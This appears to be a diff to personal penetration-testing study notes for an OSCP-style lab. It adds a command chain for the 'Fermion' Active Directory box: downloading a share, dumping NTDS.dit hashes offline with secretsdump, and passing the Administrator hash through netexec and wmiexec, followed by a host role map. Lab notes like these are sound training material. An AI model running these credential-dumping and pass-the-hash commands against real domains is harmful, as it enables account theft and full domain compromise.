@@ -984,3 +984,41 @@ This page turns one repeatable part of an authorized assessment into a checklist
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
 - [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- demonstrates anonymous LDAP, registry-hive extraction, RBCD, and ccache-based WMI
+
+## Fermion: authenticated extract share → offline NTDS → pass-the-hash
+
+```bash
+# Validate a recovered domain credential and enumerate shares.
+netexec smb $DCip -u $Username2 -p $Password2 --shares
+
+# Download a readable custom share into private loot.
+cd $BoxDir/loot/extract
+smbclient //$DCip/extract -U "$Domain/$Username2%$Password2" \
+  -c 'recurse ON; prompt OFF; mget *'
+
+# Use one aligned Impacket installation when the system wrapper has an import mismatch.
+/home/kali/.local/share/pipx/venvs/netexec/bin/secretsdump.py \
+  -ntds "$BoxDir/loot/extract/ntds.dit/Active Directory/ntds.dit" \
+  -system "$BoxDir/loot/extract/ntds.dit/registry/SYSTEM" LOCAL
+
+# Validate the recovered domain Administrator NTLM hash without cracking it.
+netexec winrm $DCip -u $AdminUser -H $AdminHash -x 'whoami && hostname'
+
+# Compatible one-shot WMI fallback when NetExec PowerShell serialization or
+# the system Impacket wrapper is unreliable.
+/home/kali/.local/share/pipx/venvs/netexec/bin/wmiexec.py \
+  -hashes aad3b435b51404eeaad3b435b51404ee:$AdminHash \
+  "$Domain/$AdminUser@$DCip" 'whoami && hostname'
+```
+
+Keep the database, hives, hashes, and proof values in private loot. `ntds.dit` plus the matching SYSTEM hive is an offline extraction route; it is not DCSync and should be routed through the offline-dump notes rather than the DCSync notes.
+
+## Fermion: role mapping in a three-host AD lab
+
+```text
+$BoxIP   = Client01 (Jenkins, 8080)
+$BoxIP2  = Srv01 (SSH, SMB, WinRM)
+$DCip    = DC01 (LDAP, Kerberos, SMB, Global Catalog, WinRM)
+```
+
+Always map the supplied IPs before applying `$BoxIP` to AD commands. The lab's first supplied address was not the attack-path entry host.
